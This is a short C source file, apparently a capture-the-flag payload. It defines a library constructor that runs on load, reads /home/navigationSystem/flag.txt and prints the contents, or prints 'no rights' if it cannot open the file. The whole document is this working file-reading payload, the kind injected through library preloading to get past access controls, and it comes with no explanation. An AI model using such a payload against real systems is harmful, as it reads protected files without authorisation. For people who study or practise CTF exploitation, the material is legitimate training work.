#include <stdio.h>

static void __attribute__((constructor)) init();

static void init()
{
    char buf[100];
    FILE *f = fopen("/home/navigationSystem/flag.txt", "r");
    if (f)
    {
        fwrite("reading\n",1,8,stdout);
        size_t n = fread(buf, 1, 100, f);
        fclose(f);
        fwrite(buf, 1, n, stdout);
        fwrite("reading\n",1,8,stdout);
    }
    else
    {
        fwrite("no rights\n",1,10,stdout);
    }
    fflush(stdout);
}
